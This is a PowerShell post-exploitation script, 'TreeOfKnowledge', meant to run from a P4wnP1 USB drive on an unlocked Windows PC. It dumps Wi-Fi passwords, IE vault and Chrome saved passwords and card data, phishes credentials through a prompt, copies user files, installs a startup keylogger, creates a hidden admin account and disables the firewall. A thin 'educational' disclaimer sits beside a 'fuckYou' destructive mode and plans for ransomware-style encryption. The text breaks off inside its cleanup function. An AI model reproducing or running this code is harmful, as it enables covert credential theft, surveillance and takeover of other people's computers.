﻿<#
************************************************************************************************************************************************************************************
TreeOfKnowledge

Version: v2.0.1 (First Production Release)


********README********
This script is meant to be a reconfigurable, case specific, powershell script to gather information from an unlocked Windows PC.
The user is able to choose what functions they wish to run in order to gather different types of information from the target machine.
Once all of the information has been gathered, it is then uploaded to an FTP server on the internet for later retreival. 
Ideally, this would be run from something like a P4wnP1 USB drive in order to not write anything to disk and be covert as possible to avoid detection or tracking.


********DISCLAIMER********
This program has been created and is intended for educational use only. It is
an example of how powershell can be used to collect various information about a host
machine and how to execute certain tasks. 


********Things to Add********
--Could I plug this in (P4wnp1 use), have it copy to PC, let me know, run, upload to web, and then clean? That way you do not have to sit in front of the PC for x amount of time as it does everything?
    -Wouldn't work for above case, but could I use P4wnP1 in conjunction with this to click Yes on admin prompts? (Copy files and run, Run admin things first while still plugged in?)
-Possible to add/change HOST file on PC?
-Download an EXE to the PC and run it?
-PowerSploit for mainintg access?
-Start a keylogger and send results to FTP?
-Possible to open camera or MIC and make available for streaming? ICEcast or something?
-Load a portable pre-configured teamviewer?
-Get any other connected devices (bluetooth, printers, etc)
-Load portable python to run additional scripts?
-Get nasty? Encrypt files?
-Run Empire setup for C2?
-Upload files/pictures to FTP?
-Add in function to copy output files locally to the USB as well
-Persistant script that will take any print jobs/downloads/etc and upload them automatically to FTP?


********Below are a list of the functions (* = admin needed to run, ## means not currently working) and a short description********
**WORKING**
DisplayFile               #Used to display the file the user wanted to see (For use in dropped thub-drive method)
GetCurrentWifiPW          #Gets the wifi password for the currently connected network
GetAllWifiPW              #Gets all previous wifi connections and their passwords
GetIP                     #Gets the outward facing IP
GetOSVer                  #Used to get OS version of machine
CompNetInfo               #Gets info about connected/networked devices on the network - Netuse can take a long time
UserInfo                  #Retreive informaltion about local users on host
RunningProcesses          #Shows running processes on the host machine
InstalledPrograms         #Lists the programs currently installed on the computer and their versions and install date - Can take a while depending on what is installed
GetSchedTasks             #Gets list of scheduled tasks on computer
GetFSInfo                 #Gets filesystem information using FSUTIL
GetComInt                 #Lists COM interfaces on the host
GetSysInfo                #Gets lots of system information using SYSTEMINFO
GetTree                   #Uses Tree command to display contents of dir in tree fashion
GetNetStat                #Uses netstat to show current connections on the computer
GetArpList                #Gets MAC address on the network using arp -a
GetRoutingTable           #Shows current IP routing table for host
GetCred                   #Gets credentials of user --------AFTER PROMPTING THEM--------
ErrorLog                  #Keeps track of errors that are thrown during functions. Outputs to file on pc (for testing). Otherwise, array will be added to email body
Upload					  #Uploads out-files to FTP server
UploadBackup			  #Backup upload in case the 1st server is offline for some reason
Cleaner                   #Starts a .bat file that kills all processes associated with the program and deletes all files that were saved locally to machine


**BROKEN**
*MakeAdmin                ##Used to make script run with admin priv
*TakeOver                 ##Used to activate Guest profile, reset password, and add to proper groups for executing commands
*AddUser                  ##NEEDS ADMIN - Adds lclAdmin as a local profile
*EnableRDP                ##Enables RDP on the computer and in the firewall
*DisableFW                ##NEEDS ADMIN - Disables Windows firewall
*ShowFirewall             #Shows all settings for the firewall using netsh - prompts for admin


***UNTESTED***
DumpChromeDB
ChromeDBParse
StealYoFiles
DumpIEDB
Keylogger


************************************************************************************************************************************************************************************
#>


function Main{
    #Main Function that sets global variables, and then calls other functions based on use case


    ###Define global variables
    $global:OS = 0                #Global Variable used to hold OS Version
    $global:Wifi = ""             #Global variable used to hold Current WiFi connection information
    $global:AllWifi = ""          #Global variable used to hold all previous WiFi connection information
    $global:IP = ""               #Global variable used to hold external IP of machine
    $global:InternalIP = ""       #Global variable to hold the intoernal IP information of the machine
    $global:Cred = ""             #Global variable used to hold credentials of user (after they are prompted to put them in)
    $global:Break = " "           #Line break for output purposes
    $global:ProfileList = @()     #Global array to hold wireless profiles previously connected to by the host
    $global:LogArray = @()        #Global array used to hold logs and errors of functions. LOGGING IS ALWAYS ON (Just not always dumped into text file per ErrorLogging function)
    $global:OutArray = @()        #Global array used to hold all global variables to send in email
    $global:UserList = @()        #Global array to hold the list of local users for the host
    $global:UserInfo = @()        #Global array used to hold information about hosts users
    $global:CompNetInfo = @()     #Global array used to hold info about other connected devices on the network
    $global:Processes = @()       #Global array used to hold all the running processes on the machine
    $global:InstalledPrgs = @()   #Global array to hold all the installed programs on the computer
    $global:UserListArray = @()   #Global array to hold user names from previous function
    $global:DirInfo = ""          #Global variable to hold all information from output of DIR commands
    $global:DiskList = @()        #Global array to hold the names of the disks currently connected to the host so they can be looped through for information
    $global:usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq 'USB Drive' } | select name



    ###Call functions for use case (grouped)
    #informationOnly    #This starts a group of functions strictly for getting infomation off of the victim PC only
    #invasive           #This starts all of the information gathering functions, as well as more invasife gathering functions, but is not destructive
    #fuckYou            #This starts all of the information gathering functions, but also destructive ones once we get all the information possible

    manual              #This function is to allow for manual starting of the functions (uncomment each as needed)
}

function manual(){
    ###Below are the individual functions we can start
    #DisplayFile
    #MakeAdmin
    #TakeOver
    #GetOSVer
    #AddUser
    #GetCurrentWifiPW
    #GetAllWifiPW
    #GetIP
    #EnableRDP
    #DisableFW
    #ShowFirewall
    #CompNetInfo
    #UserInfo
    #RunningProcesses
    #InstalledPrograms
    #GetFSInfo
    #GetSchedTasks
    #GetComInt
    #GetSysInfo
    #GetNetStat
    #GetArpList
    #GetRoutingTable
	#GetCred
    #DumpIEDB
    #DumpChromeDB
    #ChromeDBParse
    #StealYoFiles
    Keylogger
    #GetTree
    #ErrorLog
	#Upload
	#UploadBackup
    #Cleaner
}

function informationOnly(){

    #This function starts a group of other functions that are meant to get information only

    GetOSVer
    GetCurrentWifiPW
    GetAllWifiPW
    GetIP
    CompNetInfo
    UserInfo
    RunningProcesses
    InstalledPrograms
    GetFSInfo
    GetSchedTasks
    GetComInt
    GetSysInfo
    GetNetStat
    GetArpList
    GetRoutingTable
    DumpIEDB
    DumpChromeDB
    GetTree
    ErrorLog
	Upload
	UploadBackup
    Cleaner
}

function invasive(){

    #This function gathers all kinds of information from the host, but then will start to be more invasive in what we gather (keylogger, mic, video, etc)

    GetOSVer
    GetCurrentWifiPW
    GetAllWifiPW
    GetIP
    CompNetInfo
    UserInfo
    RunningProcesses
    InstalledPrograms
    GetFSInfo
    GetSchedTasks
    GetComInt
    GetSysInfo
    GetNetStat
    GetArpList
    GetRoutingTable
	GetCred
    DumpIEDB
    DumpChromeDB
    ChromeDBParse
    StealYoFiles
    Keylogger
    GetTree
    ErrorLog
	Upload
	UploadBackup
    Cleaner
}

function fuckYou(){

    #This function gathers all kinds of info about the PC and network, then starts to fuck with and be destructive to the host PC

    GetOSVer
    GetCurrentWifiPW
    GetAllWifiPW
    GetIP
    CompNetInfo
    UserInfo
    RunningProcesses
    InstalledPrograms
    GetFSInfo
    GetSchedTasks
    GetComInt
    GetSysInfo
    GetNetStat
    GetArpList
    GetRoutingTable
    DumpIEDB
    DumpChromeDB
    GetTree
    ErrorLog
	Upload
	UploadBackup
    Cleaner    
}

function DisplayFile(){
    #Displays file that the user intended to see
    notepad "\PLEASE RETURN IF FOUND.txt"
}

function MakeAdmin(){
    #Run as admin under no profile and bypass execution policy - STILL HAS POP-UP BOX!! - ONLY WINDOWS 8.1 AND 10?????
    if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) { 
        Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs; exit 
    }

    #Used to try and click yes on security pop-up
    $wshell = New-Object -ComObject wscript.shell;
    $wshell.AppActivate('User Account Control')
    Sleep 1
    $wshell.SendKeys({LEFT}, '~')
}
    
function TakeOver(){
    #Entire function is used to enable guest account and make it admin with different credentials. Then it can be used to run other files as admin
    #[boolean]($Guest.UserFlags.value -BAND "0x0002") - returns false on disabled acct. [boolean]($Guest.UserFlags.value -bxor "0x0002") - returns true on disabled acct
    #IF account is disabled, enable it.
    If ($Guest.userflags.value -band "0x0002"){
        $Guest.userflags.value = $Guest.userflags.value -bxor "0x0002"
        $Guest.SetInfo()
    }
        
    #Reset password
    $Guest.setpassword("Welcome1")
        
    #Add user to groups
    NET LOCALGROUP "Administrators" "Guest" /ADD
    NET LOCALGROUP "Remote Desktop Users" "Guest" /ADD
}
    
function GetOSVer(){
    #Get OS Version sit it to Global:OS
    $global:OS = (Get-WmiObject -class Win32_OperatingSystem).Caption

    #Output variable OS to text file
    $global:OS | out-file -FilePath C:\Users\Public\OSVer.txt

    #Fill array OutArray with OS for emailing and logging
    $global:OutArray += $global:OS
}

function AddUser(){
    #Adds user account to computer and adds them to necessary groups

    $User = "lclAdmin"    #User name to add to local machine

    #Add local user
    NET USER $User "password" /ADD

    #add user to group
    NET LOCALGROUP "Administrators" $User /ADD
    NET LOCALGROUP "Remote Desktop Users" $User /ADD

    #hide user from login screen
    $path = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList'
    New-Item $path -Force | New-ItemProperty -Name User1 -Value 0 -PropertyType DWord -Force
}

function GetCurrentWifiPW(){
    #gets and sets the variable for the currently connected wifi network to pass into following command
    $ssid = netsh wlan show interfaces | select-string 'SSID'

    #Trims string down to just the profile name
    $Profile += ($ssid -split ':')[1].trim()
        
    #Exports details about network with the SSID of the currently connected wireless network read in fomr variable SSID
    $global:Wifi = netsh wlan show profile name=$Profile key=clear | out-file -FilePath C:\Users\Public\GetCurrentWifiPW.txt

    #Set Global:Wifi to output of export command
    $global:Wifi = get-content C:\Users\Public\GetCurrentWifiPW.txt

    #Set variable to appays for mailing and logging
    $global:OutArray += $global:Wifi
}

function GetAllWifiPW(){
    #Gets list of all previously connected wifi connections

    #Get all wireless profiles saved to the host
    $ssidList = netsh wlan show profiles | select-string 'All User Profile'

    #Trims strings down to just show the profile name (shows up to 10)
    $Profile1 = ($ssidList -split ':')[1].trim()
    $Profile2 = ($ssidList -split ':')[3].trim()
    $Profile3 = ($ssidList -split ':')[5].trim()
    $Profile4 = ($ssidList -split ':')[7].trim()
    $Profile5 = ($ssidList -split ':')[9].trim()
    $Profile6 = ($ssidList -split ':')[11].trim()
    $Profile7 = ($ssidList -split ':')[13].trim()
    $Profile8 = ($ssidList -split ':')[15].trim()
    $Profile9 = ($ssidList -split ':')[17].trim()
    $Profile10 = ($ssidList -split ':')[19].trim()

    #Fill profile list
    $ProfileList += $Profile1, $Profile2, $Profile3, $Profile4, $Profile5, $Profile6, $Profile7, $Profile8, $Profile9, $Profile10
    $ProfileList | out-file -FilePath C:\Users\Public\WifiProfList.txt

    #Get passwords fo each profile and write to text file
    foreach($Profile in $ProfileList){
        #Exports details about network with the SSID of the currently connected wireless network read in from variable SSID
        $global:AllWifi += netsh wlan show profile name=$Profile key=clear
        }

    #Write AllWifi to a text file
    $global:AllWifi | out-file -FilePath C:\Users\Public\AllWirelessProfiles.txt

    #Set variable to appays for mailing and logging
    $global:OutArray += $global:AllWifi
}
    
function GetIP(){
    #Show outside IP of device
	$global:IP = new-object System.Net.WebClient
    $global:IP.DownloadString("http://myexternalip.com/raw") | out-file -FilePath C:\Users\Public\PublicIP.txt

    #Get internal IP info of device
    $global:InternalIP += ipconfig /all | out-file -FilePath C:\Users\Public\InternalIP.txt

    #Set variable to appays for mailing and logging
    $global:OutArray += $global:IP
    $global:OutArray += $global:InternalIP
}

function GetCred(){
    #Get credentials of local users. *A popup box will appear*. User MUST enter info or will not work.
    
	$credential = get-credential
	$credential.ControlBox = $False
    $credential.UserName | out-file -FilePath C:\Users\Public\GetCredUserName.txt
    $credential.GetNetworkCredential().password | out-file -FilePath C:\Users\Public\GetCredPW.txt

    #Set Global:Cred to credentials
    $global:Cred = get-content C:\Users\Public\GetCredUserName.txt, C:\Users\Public\GetCredPW.txt
    $global:Cred | out-file -FilePath C:\Users\Public\GetCred.txt

    #Set variable to appays for mailing and logging
    $global:OutArray += $global:Cred
}

function EnableRDP(){
    #Enables RDP on machine as well as in Windows Firewall
    Set-RemoteDesktopConfig -Enable -ConfigureFirewall
}
    
function DisableFW(){
    #Disables Windows firewall
    netsh advfirewall set allprofiles state off
}

function ShowFirewall(){
    #Uses export command to show current settings
    netsh advfirewall export C:\Users\Public\ShowFirewallExport.txt

    #Shows firewall settings for all profiles
    netsh advfirewall show allprofiles | out-file -FilePath C:\Users\Public\ShowFirewallAll.txt

    #Shows firewall settings for current profile
    netsh advfirewall show currentprofile | out-file -FilePath C:\Users\Public\ShowFirewallCurrent.txt

    #Shows firewall settings for global profile
    netsh advfirewall show global | out-file -FilePath C:\Users\Public\ShowFirewallGlobal.txt

    #Shows firewall settings for store
    netsh advfirewall show store | out-file -FilePath C:\Users\Public\ShowFirewallStore.txt

    #-Needs Admin- Shows all consec rules
    netsh advfirewall consec show rule name=all | out-file -FilePath C:\Users\Public\ShowFirewallConsecRules.txt

    #Shows all firewall rules
    netsh advfirewall firewall show rule name=all | out-file -FilePath C:\Users\Public\ShowFirewallRules.txt

    #-Needs Admin- Shows all mainmode rules
    netsh advfirewall mainmode show rule name=all | out-file -FilePath C:\Users\Public\ShowFirewallMainModeRules.txt
}
    
function CompNetInfo(){
    #Gets info about other connected network machines or shares
    $global:CompNetInfo += net use
    $global:CompNetInfo += net view
    
    #Output info to text file
    $global:CompNetInfo | out-file -FilePath C:\Users\Public\CompNetInfo.txt

    #Set variable to appays for mailing and logging
    $global:OutArray += $global:CompNetInfo
}

function UserInfo(){
    #Retreive informaltion about users on computer
    
    #Get list of local accounts on the computer
    $List = get-wmiobject -query "Select * from Win32_UserAccount where LocalAccount = 'True'" 
    
    #Select only those lines that contain the account name and assign it to variable NameSearchResult
    $List | select-string -pattern 'Name' | out-file -FilePath C:\Users\Public\UserNameList.txt -width 500
    $NameSearchResult = get-content C:\Users\Public\UserNameList.txt

    #Split the list to show only the account name (Can hold up to 15 accts)
    $User1 += ($NameSearchResult -split 'Name=')[2] -replace '"'
    $User2 += ($NameSearchResult -split 'Name=')[4] -replace '"'
    $User3 += ($NameSearchResult -split 'Name=')[6] -replace '"'
    $User4 += ($NameSearchResult -split 'Name=')[8] -replace '"'
    $User5 += ($NameSearchResult -split 'Name=')[10] -replace '"'
    $User6 += ($NameSearchResult -split 'Name=')[12] -replace '"'
    $User7 += ($NameSearchResult -split 'Name=')[14] -replace '"'
    $User8 += ($NameSearchResult -split 'Name=')[16] -replace '"'
    $User9 += ($NameSearchResult -split 'Name=')[18] -replace '"'
    $User10 += ($NameSearchResult -split 'Name=')[20] -replace '"'
    $User11 += ($NameSearchResult -split 'Name=')[22] -replace '"'
    $User12 += ($NameSearchResult -split 'Name=')[24] -replace '"'
    $User13 += ($NameSearchResult -split 'Name=')[26] -replace '"'
    $User14 += ($NameSearchResult -split 'Name=')[28] -replace '"'
    $User15 += ($NameSearchResult -split 'Name=')[30] -replace '"'    
    
    #Output the list to a text file
    $UserList += $User1, $User2, $User3, $User4, $User5, $User6, $User7, $User8, $User9, $User10, $User11, $User12, $User13, $User14, $User15
    $Userlist | out-file -FilePath C:\Users\Public\UserNameList.txt

    #Run net user *** for each local username in the text file UserList1
    foreach ($User in $UserList){
        #Run net user for current username
        $Info = net user $User
        
        #Dump user info into UserInfo array
        $global:UserInfo += $Info, $Break, $Break
        
        #Clear Info variable
        $Info = $null
    }
    
    #Print info to text file
    $global:UserInfo | out-file -FilePath C:\Users\Public\IndivUserInfo.txt

    #Set variable to appays for mailing and logging
    $global:OutArray += $global:UserInfo
}

function RunningProcesses(){
    #Shows running processes on the host machine
    $global:Processes += tasklist
    
    #Output to text file
    $global:Processes | out-file -FilePath C:\Users\Public\Processes.txt

    #Set variable to appays for mailing and logging
    $global:OutArray += $global:Processes
}

function InstalledPrograms(){
    #Lists all installed programs on the local machine
    $global:InstalledPrgs = get-wmiobject -class win32_product

    #Output to text file
    $global:InstalledPrgs | out-file -FilePath C:\Users\Public\InstalledPrgs.txt
        
    #Set variable to appays for mailing and logging
    $global:OutArray += $global:InstalledPrgs
}

function GetFSInfo(){
    #Gets information about local drives and file system
    fsutil fsinfo drives | out-file -FilePath C:\Users\Public\GetFSInfo.txt

    #Read in list of drives
    $Disks = get-content C:\Users\Public\GetFSInfo.txt

    #Split file so drive letter is on seperate lines and output to file
    $global:DiskList = ($Disks -split '\s+') -replace 'Drives:' | ?{$_.trim() -ne ""} | out-file -FilePath C:\Users\Public\DiskList.txt
}

function GetSchedTasks(){
    #Gets list of scheduled tasks from Task Scheduler
    schtasks | out-file -FilePath C:\Users\Public\GetSchedTasks.txt
}

function GetComInt(){
    #Lists COM interfaces on host and their settings
    mode | out-file -FilePath C:\Users\Public\GetComInfo.txt
}

function GetSysInfo(){
    #Gets detailed information about host machine
    systeminfo | out-file -FilePath C:\Users\Public\GetSysInfo.txt
}

function GetTree(){
    #Displays content of current directory in a tree
    #!!!! MUST BE RUN WITH USERINFO AND GETFSINFO!!!!

    #Create file to hold information
    new-item C:\Users\Public\GetDiskTree.txt -type file -force
    new-item C:\Users\Public\GetUserTree.txt -type file -force

    #Read in content to variable
    $global:DiskList = get-content C:\Users\Public\DiskList.txt

    #Loop through each disk on the host
    foreach ($Disk in $global:DiskList){
        #Set shell to disk location
        cd $Disk

        #Get tree from disk
        tree | out-file -FilePath C:\Users\Public\IndivDiskTree.txt

        #Combine output files
        get-content C:\Users\Public\IndivDiskTree.txt | add-content C:\Users\Public\GetDiskTree.txt

        #Clear disk var
        $Disk = $Null
    }

    #Read in content to variable
    $global:UserListArray = get-content C:\Users\Public\UserNameList.txt

    #Loop through each local user on host
    foreach ($User in $global:UserListArray){
        #Set shell position to user's home folder
        $UserHomeFolder += 'C:\users\'
        $UserHomeFolder += $User
        $UserHomeFolder += '\'
        cd $UserHomeFolder
        
        #Get user name
        $User | out-file -FilePath C:\Users\Public\CurrentUserName.txt

        #Get tree from user
        tree | out-file -FilePath C:\Users\Public\IndivUserTree.txt

        #Combine output files
        get-content C:\Users\Public\CurrentUserName.txt, C:\Users\Public\IndivUserTree.txt | add-content C:\Users\Public\GetUserTree.txt

        #Clear UserHomeFolder var
        $UserHomeFolder = $null
    }

    remove-item C:\Users\Public\IndivDiskTree.txt, C:\Users\Public\IndivUserTree.txt, C:\Users\Public\CurrentUserName.txt
}

function GetNetStat(){
    #Shows list of current connections on the computer using netstat
    netstat -a -q -f | out-file -FilePath C:\Users\Public\GetNetStat.txt
}

function GetArpList(){
    #Shows known MAC addresses using the ARP table
    arp -a | out-file -FilePath C:\Users\Public\GetArpList.txt
}

function GetRoutingTable(){
    #Shows current routing table on machine
    route print | out-file -FilePath C:\Users\Public\GetRoutingTable.txt
}

function DumpIEDB(){
    ###Dump IE DB and creds

    #Set USB path and file
    $usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq 'USB Drive' } | select name
    $file = $usbPath.name
    $file += '\\IEpasswd.txt'

    #Grab DB and save to file path
    [Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
    (New-Object Windows.Security.Credentials.PasswordVault).RetrieveAll() | ForEach-Object { $_.RetrievePassword()
    } | Select-Object -Property Username, Password, Resource | Out-File -FilePath $file
}

function DumpChromeDB(){
    ###Dumping chrome DB - By default saves it to the flash drive

    #Get flashdrive name from system
    $usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq 'USB Drive' } | select name #"p4wnp1" = UMS name
    $OS = [environment]::OSVersion.Version

    #Get the path to Chrome and select what we want
    $chromepath = $($env:LOCALAPPDATA)
    $chromepath += '\\Google\\Chrome\\User Data\\Default'
    $WebDatadb = $chromepath
    $WebDatadb += '\\Web Data'
    $loginDatadb = $chromepath
    $loginDatadb += '\\Login Data'
    $historydb = $chromepath
    $historydb += '\\History'

    #Copy the DBs
    Copy-Item -Path $WebDatadb -Destination $usbPath.name -Force
    Copy-Item -Path $loginDatadb -Destination $usbPath.name -Force
    Copy-Item -Path $historydb -Destination $usbPath.name -Force

    #we have the DB files saved for looking through later, but now we are going to decrypt the passwords
    cd $usbpath.name
    $file = $usbPath.name
    $file += '\\chrome_dump.txt'
}

function ChromeDBParse(){
    <#
      .SYNOPSIS
      This function returns any passwords and history stored in the chrome sqlite databases.

      .DESCRIPTION
      This function uses the System.Data.SQLite assembly to parse the different sqlite db files used by chrome to save passwords and browsing history. The System.Data.SQLite assembly
      cannot be loaded from memory. This is a limitation for assemblies that contain any unmanaged code and/or compiled without the /clr:safe option.

      .PARAMETER OutFile
      Switch to dump all results out to a file.

      .EXAMPLE

      Get-ChromeDump -OutFile "$env:HOMEPATH\chromepwds.txt"

      Dump All chrome passwords and history to the specified file

      .LINK
      http://www.xorrior.com

      #>

        #Add the required assembly for decryption

        Add-Type -Assembly System.Security

        #Check to see if the script is being run as SYSTEM. Not going to work.
        if(([System.Security.Principal.WindowsIdentity]::GetCurrent()).IsSystem){
          Write-Warning "Unable to decrypt passwords contained in Login Data file as SYSTEM."
          $NoPasswords = $True
        }

        if([IntPtr]::Size -eq 8)
        {
            #64 bit version
        }
        else
        {
            #32 bit version
    
        }
        #Unable to load this assembly from memory. The assembly was most likely not compiled using /clr:safe and contains unmanaged code. Loading assemblies of this type from memory will not work. Therefore we have to load it from disk.
        #DLL for sqlite queries and parsing
        #http://system.data.sqlite.org/index.html/doc/trunk/www/downloads.wiki
        Write-Verbose "[+]System.Data.SQLite.dll will be written to disk"
    
   
        $content = [System.Convert]::FromBase64String($assembly) 
    
    
    
        $assemblyPath = "$($env:LOCALAPPDATA)\System.Data.SQLite.dll" 
    
    
        if(Test-path $assemblyPath)
        {
          try 
          {
            Add-Type -Path $assemblyPath
          }
          catch 
          {
            Write-Warning "[!]Unable to load SQLite assembly"
            break
          }
        }
        else
        {
            [System.IO.File]::WriteAllBytes($assemblyPath,$content)
            Write-Verbose "[+]Assembly for SQLite written to $assemblyPath"
            try 
            {
                Add-Type -Path $assemblyPath
            }
            catch 
            {
                Write-Warning "[!]Unable to load SQLite assembly"
                break
            }
        }

        #Check if Chrome is running. The data files are locked while Chrome is running 

        if(Get-Process | Where-Object {$_.Name -like "*chrome*"}){
          Write-Warning "[!]Cannot parse Data files while chrome is running"
          break
        }

        #grab the path to Chrome user data
        $OS = [environment]::OSVersion.Version
        if($OS.Major -ge 6){
          $chromepath = "$($env:LOCALAPPDATA)\Google\Chrome\User Data\Default"
        }
        else{
          $chromepath = "$($env:HOMEDRIVE)\$($env:HOMEPATH)\Local Settings\Application Data\Google\Chrome\User Data\Default"
        }
    
        if(!(Test-path $chromepath)){
          Throw "Chrome user data directory does not exist"
        }
        else{
          #DB for CC and other info
          if(Test-Path -Path "$chromepath\Web Data"){$WebDatadb = "$chromepath\Web Data"}
          #DB for passwords 
          if(Test-Path -Path "$chromepath\Login Data"){$loginDatadb = "$chromepath\Login Data"}
          #DB for history
          if(Test-Path -Path "$chromepath\History"){$historydb = "$chromepath\History"}
          #$cookiesdb = "$chromepath\Cookies"

        }

        #$OutFile = "C:\Users\Cortana\Desktop\chrome_dump.txt"

        if(!($NoPasswords)){ 

          #Parse the login data DB
          $connStr = "Data Source=$loginDatadb; Version=3;"

          $connection = New-Object System.Data.SQLite.SQLiteConnection($connStr)

          $OpenConnection = $connection.OpenAndReturn()

          Write-Verbose "Opened DB file $loginDatadb"

          $query = "SELECT * FROM logins;"

          $dataset = New-Object System.Data.DataSet

          $dataAdapter = New-Object System.Data.SQLite.SQLiteDataAdapter($query,$OpenConnection)

          [void]$dataAdapter.fill($dataset)

          $logins = @()

          # https://github.com/adobe/chromium/blob/master/webkit/forms/password_form.h#L45-L50
          $scheme_enum = @{0 = "HTML";1 = "BASIC";2 = "DIGEST"; 3 = "OTHER"}

          Write-Verbose "Parsing results of query $query"

          $dataset.Tables | Select-Object -ExpandProperty Rows | ForEach-Object {
            $encryptedBytes = $_.password_value
            $username = $_.username_value
            $action_url = $_.action_url
            $origin_url = $_.origin_url
            $scheme = $scheme_enum[[int]$_.scheme]
            $decryptedBytes = [Security.Cryptography.ProtectedData]::Unprotect($encryptedBytes, $null, [Security.Cryptography.DataProtectionScope]::CurrentUser)
            $plaintext = [System.Text.Encoding]::ASCII.GetString($decryptedBytes)
            $login = New-Object PSObject -Property @{
              ORIGIN_URL = $origin_url
              ACTION_URL = $action_url
              PWD = $plaintext
              USER = $username
              SCHEME = $scheme
            }
            $logins += $login
            #$logins | Out-File $OutFile -Append
          }
        }

        #Parse the CC data DB
        $connStr = "Data Source=$WebDatadb; Version=3;"

        $connection = New-Object System.Data.SQLite.SQLiteConnection($connStr)

        $OpenConnection = $connection.OpenAndReturn()

        Write-Verbose "Opened DB file $WebDatadb"

        $query = "SELECT * FROM masked_credit_cards;"

        $dataset = New-Object System.Data.DataSet

        $dataAdapter = New-Object System.Data.SQLite.SQLiteDataAdapter($query,$OpenConnection)

        [void]$dataAdapter.fill($dataset)

        $credit_cards = @()

        # https://github.com/adobe/chromium/blob/master/webkit/forms/password_form.h#L45-L50
        #$scheme_enum = @{0 = "HTML";1 = "BASIC";2 = "DIGEST"; 3 = "OTHER"}

        Write-Verbose "Parsing results of query $query"

        $dataset.Tables | Select-Object -ExpandProperty Rows | ForEach-Object {
            $encryptedBytes = $_.id
            $name = $_.name_on_card
            $expmonth = $_.exp_month
            $expyear = $_.exp_year
            $lastfour = $_.last_four
            $network = $_.network
            #$billing_addr = $_.billing_address_id
            #$scheme = $scheme_enum[[int]$_.scheme]
            $decryptedBytes = [Security.Cryptography.ProtectedData]::Unprotect($encryptedBytes, $null, [Security.Cryptography.DataProtectionScope]::CurrentUser)
            $plaintext = [System.Text.Encoding]::ASCII.GetString($decryptedBytes)
            $card = New-Object PSObject -Property @{
                NAME = $name
                EXP_MONTH = $expmonth
                EXP_YEAR = $expyear
                CC_NUM = $plaintext
                LAST_FOUR = $lastfour
                NETWORK = $network
                #ADDR = $billing_addr
                #SCHEME = $scheme
            }

        $credit_cards += $card
        #$credit_cards | Out-File $OutFile -Append

        }

        #Parse the History DB
        $connString = "Data Source=$historydb; Version=3;"

        $connection = New-Object System.Data.SQLite.SQLiteConnection($connString)

        $Open = $connection.OpenAndReturn()

        Write-Verbose "Opened DB file $historydb"

        $DataSet = New-Object System.Data.DataSet

        $query = "SELECT * FROM urls;"

        $dataAdapter = New-Object System.Data.SQLite.SQLiteDataAdapter($query,$Open)

        [void]$dataAdapter.fill($DataSet)

        $History = @()
        $dataset.Tables | Select-Object -ExpandProperty Rows | ForEach-Object {
          $HistoryInfo = New-Object PSObject -Property @{
            Title = $_.title 
            URL = $_.url
          }
          $History += $HistoryInfo
          #$History | Out-File $OutFile -Append

        }
    
    "[*]CHROME PASSWORDS`n"
    $logins | Format-List ORIGIN_URL, ACTION_URL, PWD, USER, SCHEME | Out-String

    "[*]CHROME CC INFO`n"
    $credit_cards | Format-List NAME, EXP_MONTH, EXP_YEAR, CC_NUM, LAST_FOUR, NETWORK | Out-String

    "[*]CHROME HISTORY`n"
    $History | Format-List Title,URL | Out-String

    
    <#
        if(!($OutFile)){
          "[*]CHROME PASSWORDS`n"
          $logins | Format-List ORIGIN_URL, ACTION_URL, PWD, USER, SCHEME | Out-String

          "[*]CHROME CC INFO`n"
            $credit_cards | Format-List NAME, EXP_MONTH, EXP_YEAR, CC_NUM, LAST_FOUR, NETWORK | Out-String

          "[*]CHROME HISTORY`n"

          $History | Format-List Title,URL | Out-String
        }
        else {
            "[*]LOGINS`n" | Out-File $OutFile 
            $logins | Out-File $OutFile -Append

            "[*]CARDS`n" | Out-File $OutFile 
            $credit_cards | Out-File $OutFile -Append

            "[*]HISTORY`n" | Out-File $OutFile -Append
            $History | Out-File $OutFile -Append  

        }
    #>
    
    Write-Warning "[!] Please remove SQLite assembly from here: $assemblyPath"

}

function StealYoFiles(){
    ###Copying home dir files to USB

    #Select the USB path to save the files to
    $usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq 'USB DRIVE' } | select name

    #Define the file types we want to copy
    $filetypes = @("jpg", "jpeg", "png", "txt", "doc", "docx", "rtf", "pdf")

    #Loop through the DIR and copy al the files
    for ($i = 0; $i -le $filetypes.length; $i++) {
        copy */*." + filetypes[i] + " $usbpath.name
    }
}

function Keylogger(){
    #This function copies over a keelogger script from the root of the USB flash drive. It will then add it to the startup folder for the user so it runs each time that the user logs in (persistance). It will FTP upload the results (with a backup location) to a web FTP server for later collection

    #Get startup folder name on PC
    $OS = [environment]::OSVersion.Version
    $startupPath = $($env:APPDATA)
    $startupPath += '\Microsoft\Windows\Start Menu\Programs\Startup\'

    #Set path for the files
    $keyloggerPath = $global:usbPath.name + "windows_startup\windows_startup.ps1"
    $VBSrunPath = $global:usbPath.name + "windows_startup\windows_startup.vbs"
    $BATrunPath = $global:usbPath.name + "windows_startup\windows_startup.bat"
    $secretPath = "C:\Users\Public\"

    #Copy scripts to their folders
    Copy-Item -Path $VBSrunPath -Destination $startupPath -Force
    Copy-Item -Path $BATrunPath -Destination $secretPath -Force
    Copy-Item -Path $keyloggerPath -Destination $secretPath -Force

    #Start the keylogger silently
    cd $startupPath
    $command = ".\windows_startup.vbs"
    invoke-expression $command
}

function ErrorLog(){
    #Output LogArray to log file
    $global:LogArray | out-file -FilePath C:\Users\Public\Log.txt
}
    
function Cleaner(){
    #Kills all processes associated with the program and deletes all files that were saved locally to machine
    #Needs to kill powershell processes
    #Needs to remove any log files created within windows
        

    #Clear global variables and arrays
    $global:OS = $null
    $global:Wifi = $null
    $global:AllWifi = $null
    $global:IP = $null
    $global:Cred = $null
    $global:NetInfo = $null
    $global:UserList = $null
    $global:UserInfo = $null
    $global:CompNetInfo = $null
    $global:Processes = $null
    $global:InstalledPrgs = $null
    $global:LogArray = $null
    $global:OutArray = $null
    $global:UserListArray = $null
    $global:DirInfo = $null
